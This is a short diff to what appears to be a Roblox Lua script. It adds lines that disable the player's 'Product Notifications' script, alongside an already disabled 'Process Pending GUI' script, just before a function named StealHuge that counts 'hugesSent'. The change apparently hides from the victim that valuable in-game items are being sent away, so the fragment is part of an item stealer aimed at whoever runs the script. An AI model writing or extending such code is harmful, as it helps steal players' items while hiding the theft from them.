@@ -55,7 +55,9 @@ gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
 end)
 
 local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Product Notifications"]
 loading.Disabled = true
+noti.Disabled = true
 
 function StealHuge()
 	local hugesSent = 0
